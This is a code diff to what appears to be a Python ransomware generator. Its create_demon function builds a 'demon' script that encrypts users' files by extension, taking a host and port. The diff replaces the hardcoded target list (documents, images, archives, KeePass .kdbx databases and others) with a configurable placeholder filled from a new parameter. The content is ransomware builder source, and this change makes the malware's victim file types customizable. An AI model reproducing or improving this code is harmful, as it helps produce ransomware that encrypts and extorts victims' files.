@@ -1,6 +1,6 @@
 import platform
 
-def create_demon(host, port, fullscreen, demo, type, msg, img_base64, mode, debug):
+def create_demon(host, port, fullscreen, demo, type, msg, img_base64, mode, debug, ext):
     demon = """#/usr/bin/env python3
 import os, sys, socket, string, random, hashlib, getpass, platform, threading, datetime, time, base64
 <import_pil>
@@ -38,10 +38,7 @@ global platform
 platform = platform.system()
 
 # Encrypt file that endswith
-ext = ['.txt',
-    '.ppt','.pptx','.doc','.docx','.gif','.jpg','.png', '.ico', '.mp3','.ogg',
-    '.csv','.xls','.exe','.pdf', '.ods','.odt','.kdbx','.kdb','.mp4','.flv','.ini',
-    '.iso','.zip','.tar','.tar.gz','.rar']
+ext = [<ext>]
 
 def get_target():
     # Users home on Linux
@@ -182,6 +179,14 @@ class mainwindow(Tk):
 
     start_gui = """main = mainwindow()
         main.mainloop()"""
+
+    list = ''
+
+    for line in ext.split('\n'):
+        list = list + "%s" % ("'." + line + "',\n")
+    print(list)
+    demon = demon.replace('<ext>', list)
+
 
     if mode == 1:
         demon = demon.replace('<gui>', gui)
